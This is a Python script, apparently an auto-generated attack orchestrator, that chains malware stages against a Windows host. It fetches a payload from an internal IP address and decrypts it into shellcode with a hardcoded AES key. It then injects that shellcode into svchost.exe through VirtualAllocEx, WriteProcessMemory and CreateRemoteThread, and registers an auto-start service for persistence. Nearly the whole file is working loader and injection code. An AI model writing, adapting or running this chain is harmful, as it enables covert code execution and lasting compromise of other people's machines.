#!/usr/bin/env python3
import sys
import json
import time
import requests
from typing import Dict, Any
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import ctypes
import subprocess

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        url = "https://192.168.156.189/api"
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        payload_data = response.content
        result = {
            'data': payload_data.hex(),
            'url': url
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        aes_key = b'ThisIsA16ByteKey'
        aes_iv = b'ThisIsA16ByteIV_'
        encrypted_data = bytes.fromhex(input_data.get('data', ''))
        cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        result = {'shellcode': decrypted_data.hex()}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'shellcode': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        shellcode = bytes.fromhex(input_data.get('shellcode', ''))
        process = subprocess.run(
            ['tasklist', '/FI', 'IMAGENAME eq svchost.exe', '/FO', 'CSV'],
            capture_output=True, text=True, timeout=10
        )
        process_lines = process.stdout.splitlines()
        if len(process_lines) < 2:
            raise Exception("svchost.exe not found")
        svchost_info = process_lines[1].split(',')
        svchost_pid = int(svchost_info[1].strip('"'))
        PROCESS_ALL_ACCESS = (0x1F0FFF)
        kernel32 = ctypes.windll.kernel32
        process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, svchost_pid)
        if not process_handle:
            raise Exception("Failed to open svchost.exe process")
        memory_allocation = kernel32.VirtualAllocEx(process_handle, 0, len(shellcode), 0x3000, 0x40)
        if not memory_allocation:
            raise Exception("Memory allocation failed")
        bytes_written = ctypes.c_size_t(0)
        if not kernel32.WriteProcessMemory(process_handle, memory_allocation, shellcode, len(shellcode), ctypes.byref(bytes_written)):
            raise Exception("Failed to write shellcode to process memory")
        thread_id = ctypes.c_ulong(0)
        if not kernel32.CreateRemoteThread(process_handle, None, 0, memory_allocation, None, 0, ctypes.byref(thread_id)):
            raise Exception("Failed to create remote thread")
        kernel32.CloseHandle(process_handle)
        return {'success': True, 'data': {'success': True},
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'success': False},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    service_name = "MyPersistentService"
    try:
        command = [
            "sc", "create", service_name,
            "binPath=", "\"C:\\Path\\To\\Executable.exe\"",
            "start=", "auto"
        ]
        subprocess.run(command, check=True, timeout=10)
        result = {
            "service_name": service_name,
            "registered": True
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        result = {
            "service_name": service_name,
            "registered": False
        }
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Download Payload [exfiltration] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Download Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Download Payload): FAILED — {err}')
            failed.append('T1')
            r2 = task_T1(None)
            if r2.get('success'):
                outputs['T1'] = r2.get('data', {})
                failed.remove('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T4: Establish Persistence [persistence] ──
    try:
        r = task_T4(None)
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Establish Persistence): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Establish Persistence): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    # ── T2: Decrypt Payload [defense-evasion] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Decrypt Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Decrypt Payload): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Inject Shellcode [execution] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Inject Shellcode): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Inject Shellcode): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))